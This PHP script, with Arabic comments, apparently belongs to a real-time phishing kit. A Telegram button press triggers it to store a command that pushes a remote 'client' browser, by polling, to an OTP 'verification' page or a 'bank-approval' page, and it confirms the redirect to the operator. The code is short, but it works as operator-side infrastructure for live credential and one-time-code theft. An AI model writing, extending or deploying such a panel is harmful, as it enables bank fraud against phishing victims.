<?php
/**
 * r.php — لما تضغط زر التوجيه من تيليجرام
 * يحفظ الأمر → العميل (من أي متصفح) ينتقل تلقائياً عبر الـ polling
 */

require __DIR__ . '/store.php';

$sessionId = isset($_GET['s']) ? sid($_GET['s']) : '';
$type = isset($_GET['t']) ? $_GET['t'] : '';

$target = null;
if ($type === 'otp' || $type === 'verification') {
    $target = 'verification';
} elseif ($type === 'bank' || $type === 'bank-approval') {
    $target = 'bank-approval';
}

$ok = false;
if ($sessionId && $target) {
    $ok = set_command($sessionId, $target);
}

header('Content-Type: text/html; charset=utf-8');
?>
<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>تم التوجيه</title>
  <style>
    body{font-family:system-ui,sans-serif;background:#0f1115;color:#fff;display:flex;min-height:100vh;align-items:center;justify-content:center;margin:0}
    .box{background:#1a1f2b;padding:28px 22px;border-radius:16px;text-align:center;max-width:420px;width:92%}
    h1{margin:0 0 10px;font-size:22px}
    p{margin:0;color:#b7c0d1;line-height:1.7}
    .ok{color:#3ddc97}
    .bad{color:#ff6b6b}
  </style>
</head>
<body>
  <div class="box">
    <?php if ($ok): ?>
      <h1 class="ok">✅ تم إرسال التوجيه</h1>
      <p>العميل سينتقل الآن تلقائياً من أي متصفح.<br>يمكنك إغلاق هذه الصفحة.</p>
    <?php else: ?>
      <h1 class="bad">❌ فشل التوجيه</h1>
      <p>تأكد أن المجلد data قابل للكتابة على الاستضافة.</p>
    <?php endif; ?>
  </div>
</body>
</html>
